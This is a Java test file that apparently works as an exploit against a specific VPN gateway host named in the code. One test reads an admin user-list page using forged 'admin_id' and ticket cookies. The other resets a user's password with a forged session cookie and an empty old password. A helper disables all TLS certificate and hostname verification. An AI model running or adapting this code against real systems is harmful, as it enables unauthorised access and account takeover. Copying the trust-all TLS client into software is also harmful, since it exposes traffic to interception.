package com.legendsec.vpnclient;

import junit.framework.TestCase;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.util.Objects;

public class VPNTest extends TestCase {

    private static final String VPN_HOST = "wegu.zhongdinggroup.com";

    public void testListUser() throws Exception {
        OkHttpClient client = buildClient();
        Request request = new Request.Builder().url("https://" + VPN_HOST + "/admin/group/x_group.php?id=2")
                .header("Cookie", "admin_id=1; gw_admin_ticket=1;")
                .build();
        try (Response response = client.newCall(request).execute()) {
            System.out.println(Objects.requireNonNull(response.body()).string());
        }
    }

    public void testChangePassword() throws Exception {
        OkHttpClient client = buildClient();

        final String pwd = "abcdefg#123A";
        Request request = new Request.Builder().url("https://" + VPN_HOST + "/changepass.php?type=2")
                .header("Cookie", "admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={\"this_name\":\"ceshi\",\"subAuthId\":\"1\"}")
                .header("Origin", "https://" + VPN_HOST)
                .header("Referer", "https://" + VPN_HOST + "/welcome.php")
                .post(new FormBody.Builder()
                        .add("old_pass", "")
                        .add("password", pwd)
                        .add("repassword", pwd)
                        .build())
                .build();
        try (Response response = client.newCall(request).execute()) {
            System.out.println(Objects.requireNonNull(response.body()).string());
        }
    }

    private static OkHttpClient buildClient() throws Exception {
        X509TrustManager tm = new X509TrustManager() {
            @Override
            public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {
            }
            @Override
            public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {
            }
            @Override
            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                return new java.security.cert.X509Certificate[]{};
            }
        };
        final SSLContext sslContext = SSLContext.getInstance("SSL");
        sslContext.init(null, new TrustManager[]{tm}, new java.security.SecureRandom());
        final SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        builder.sslSocketFactory(sslSocketFactory, tm);
        builder.setHostnameVerifier$impersonator_okhttp((s, sslSession) -> true);
        return builder.build();
    }

}
